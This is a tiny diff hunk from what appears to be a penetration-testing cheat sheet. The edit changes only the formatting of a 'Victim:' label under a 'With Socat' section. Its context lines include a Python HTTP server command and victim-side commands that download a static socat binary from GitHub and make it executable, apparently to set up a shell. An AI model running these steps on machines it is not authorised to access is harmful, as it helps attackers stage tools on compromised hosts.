@@ -16,7 +16,7 @@ python -m SimpleHTTPServer 8888
 
 ### With Socat
 
-**Victim:** 
+*Victim:* 
 ```
 wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O socat
 chmod +x socat
